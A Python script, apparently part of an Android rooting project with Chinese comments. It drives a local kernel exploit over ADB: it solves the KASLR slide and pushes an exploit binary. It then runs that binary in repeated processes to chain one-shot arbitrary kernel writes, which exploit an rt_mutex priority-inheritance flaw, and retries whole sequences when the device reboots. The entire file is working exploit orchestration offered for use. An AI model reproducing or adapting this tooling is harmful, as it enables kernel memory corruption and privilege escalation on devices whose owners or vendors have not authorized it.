#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""boot.py —— **一个 boot 里连着打多笔写**(每笔写 = 一次 pr 进程调用 = 一个新幽灵)。

为什么要它: `rt_mutex_adjust_pi` 成功走完一次链走就把 `task->pi_blocked_on` 清空 ⇒
**幽灵是一次性的** ⇒ 同一进程里连打 N 发, 只有第 1 发真的落地(后面全空转, 偶尔炸)。
所以"多笔写"必须靠"多次进程调用"来造幽灵, 而不是在一个进程里循环。

用法:
  python boot.py --fresh "dst=0x12b2b660 val=S+0x100 probe=/proc/loadavg" ; ...
  每笔写用 `;` 分隔(顺序执行)。中途炸了就整列重来(至多 --tries 次)。
"""
import io, os, re, subprocess, sys, time

BASE = r'G:\项目\Windows管理\usb\临时root'
HERE = os.path.join(BASE, 'cm57')
sys.path.insert(0, HERE)

src = io.open(os.path.join(HERE, 'auto.py'), encoding='utf-8').read().split('def main()')[0]
A = {}
exec(compile(src, 'auto.py', 'exec'), A)
sh, fresh_boot, solve_slide, build = A['sh'], A['fresh_boot'], A['solve_slide'], A['build']
ADB, DEV = A['ADB'], A['DEV']


def alive():
    r = sh([ADB, '-s', DEV, 'shell', 'getenforce'], timeout=30)
    return 'Enforcing' in (r.stdout or '') or 'Permissive' in (r.stdout or '')


def uptime():
    r = sh([ADB, '-s', DEV, 'shell', 'cat /proc/uptime'], timeout=20)
    try:
        return float((r.stdout or '0').split()[0])
    except Exception:
        return 0.0


def run_one(extra, tag, slide):
    log = '/data/local/tmp/pr%s.log' % tag
    sh([ADB, '-s', DEV, 'shell', 'rm', '-f', log])
    cmd = "chmod 755 /data/local/tmp/pr; /data/local/tmp/pr %x hammer hijack shape2 %s >%s 2>&1" % (
        slide, extra, log)
    t0 = time.time()
    sh([ADB, '-s', DEV, 'shell', cmd], timeout=240)
    time.sleep(2)
    up = uptime()
    txt = sh([ADB, '-s', DEV, 'shell', 'cat %s' % log], timeout=60).stdout or ''
    return up, txt


def main():
    args = sys.argv[1:]
    tries = 3
    fresh = '--fresh' in args
    if '--tries' in args:
        tries = int(args[args.index('--tries') + 1])
    writes = [a for a in args if not a.startswith('--')]
    if '--tries' in args:
        writes = [w for w in writes if w != args[args.index('--tries') + 1]]
    print('要打的写: %d 笔' % len(writes), flush=True)
    build()
    sh([ADB, '-s', DEV, 'push', os.path.join(HERE, 'prbin'), '/data/local/tmp/pr'])
    for attempt in range(1, tries + 1):
        print('=== 第 %d 次尝试(整列重来) ===' % attempt, flush=True)
        if fresh or attempt > 1:
            fresh_boot()
            fresh = False
        up0 = uptime()
        slide = solve_slide()
        print('slide=%x uptime=%.1f' % (slide, up0), flush=True)
        okall = True
        for i, w in enumerate(writes):
            up, txt = run_one(w, 'w%d' % i, slide)
            key = [l for l in txt.split('\n') if 'LAND' in l or 'HIT' in l or '★' in l or '×' in l or 'DONE' in l]
            print('--- 写#%d [%s] 设备 uptime=%.1f(开局 %.1f)\n    %s' % (
                i, w, up, up0, '\n    '.join(key[-8:])), flush=True)
            if up < up0 - 2 or not alive():
                print('!!! 设备重启了 ⇒ 这一列作废, 重来', flush=True)
                okall = False
                break
            if 'LAND' not in txt:
                print('!!! 写#%d 没落地(判据没动/没找到落点) ⇒ 整列作废, 重来' % i, flush=True)
                okall = False
                break
        if okall:
            print('=== 全部 %d 笔写在同一个 boot 里落地 ===' % len(writes), flush=True)
            return 0
    print('×× 用完尝试次数还没打通', flush=True)
    return 1


main()
